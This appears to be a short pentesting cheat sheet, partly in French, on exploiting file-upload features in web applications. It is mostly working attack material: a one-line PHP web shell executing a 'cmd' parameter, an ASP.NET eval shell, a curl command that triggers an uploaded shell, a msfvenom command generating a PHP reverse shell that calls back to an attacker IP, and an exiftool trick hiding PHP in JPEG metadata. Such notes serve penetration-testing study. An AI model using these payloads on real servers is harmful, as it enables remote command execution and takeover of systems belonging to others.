## What check

- The first step would be to Identifying Web Framework what language runs the web application.

- Now that we have identified the web framework and its programming language, we can test whether we can upload a file with the same extension. 


## Web Shells

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer.

**PHP**

- https://github.com/Arrexel/phpbash
- `/opt/seclists/Web-Shells`
- Custome web shell

```sh
echo '<?php system($_REQUEST['cmd']); ?>' > webshell.php
```

> We can download any of these web shells for the language of our web application, then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell.

Exploitation:

```sh
curl http://vulnerable.com/uploads/webshell.php?cmd=id
```

**ASP .NET**

- Custome web shell

```sh
<% eval request('cmd') %>
```

## Reverse Shell

We should start by downloading a reverse shell script in the language of the web application. 

**PHP**

- https://github.com/pentestmonkey/php-reverse-shell
- `/opt/seclists/Web-Shells`
- Custom Reverse Shell

```sh
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=9001 -f raw > rshell.php
```

## Exiftool

Avec une image `jpeg` legitime, coller le shell est dans les données exif de l'image - en particulier sur le `Comment` pour le garder bien à l'écart.

```sh
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" image.jpeg

mv image.jpeg image.jpeg.php
```


